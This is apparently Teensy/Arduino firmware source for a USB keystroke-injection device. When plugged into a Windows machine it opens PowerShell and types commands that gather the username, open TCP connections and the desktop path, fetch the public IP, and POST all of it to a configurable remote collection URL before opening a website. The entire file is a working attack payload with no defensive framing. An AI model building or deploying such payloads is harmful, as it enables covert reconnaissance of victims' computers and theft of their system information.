#include <Keyboard.h>

const int ledPin = 11;

String ipService = "";
String saveService = "";
String siteUrl = "";

void clearKeys() {
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(1500);
}

void runConsole() {
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();

  delay(1000);

  Keyboard.print("powershell.exe");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  clearKeys();
}

void setup() {
  pinMode(ledPin, OUTPUT);

  delay(1000);

  runConsole();

  Keyboard.print("$whoami = whoami;");
  Keyboard.print("$ports = (Get-NetTCPConnection | Select LocalAddress,LocalPort | Out-String -Stream) -Join \", \" -Replace '\\s', '';");
  Keyboard.print("$desktop = [Environment]::GetFolderPath(\"CommonDesktopDirectory\");");
  Keyboard.print("$ipv4 = Invoke-RestMethod -Uri " + ipService + " -Method GET;");
  Keyboard.print("Invoke-RestMethod -Uri " + saveService + " -Method POST -Body \"($ipv4) ($whoami) ($desktop) $ports\";");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  clearKeys();

  Keyboard.press(KEY_ENTER);
  Keyboard.release(KEY_ENTER);

  delay(1000);

  Keyboard.print("Start-Process \"" + siteUrl + "\"; exit");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  clearKeys();

  delay(3000);

  Keyboard.press(KEY_F);
  Keyboard.release(KEY_F);
  clearKeys();

  digitalWrite(ledPin, HIGH);
  delay(1000);
  digitalWrite(ledPin, LOW);
  delay(1000);
}

void loop() {
}